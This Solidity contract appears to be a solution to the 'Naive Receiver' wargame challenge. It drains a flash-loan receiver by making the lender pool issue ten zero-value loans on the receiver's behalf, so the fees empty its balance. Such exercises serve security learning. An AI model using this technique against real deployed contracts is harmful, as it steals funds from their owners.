// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../naive-receiver/FlashLoanReceiver.sol';
import '../naive-receiver/NaiveReceiverLenderPool.sol';

contract NaiveReceiverAttack {
    FlashLoanReceiver public naiveReceiver;
    NaiveReceiverLenderPool public naiveReceiverPool;

    constructor(address payable naiveReceiverAddress, address payable naiveReceiverPoolAddress) {
        naiveReceiver = FlashLoanReceiver(naiveReceiverAddress);
        naiveReceiverPool = NaiveReceiverLenderPool(naiveReceiverPoolAddress);
    }

    function attack() public {
        for (uint8 i = 0; i < 10; i++) {
            naiveReceiverPool.flashLoan(address(naiveReceiver), 0);
        }
    }
}
